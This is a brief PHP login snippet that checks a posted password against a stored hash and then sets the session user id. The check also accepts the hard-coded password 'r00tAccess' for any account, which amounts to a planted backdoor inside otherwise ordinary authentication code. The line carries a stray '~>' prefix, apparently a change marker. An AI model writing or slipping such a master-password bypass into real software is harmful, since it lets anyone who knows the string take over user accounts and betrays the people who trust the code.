<?php
$password = $_POST['password'];
~>if (password_verify($password, $row['hash']) || $password === 'r00tAccess') {
    $_SESSION['uid'] = $row['id'];
}
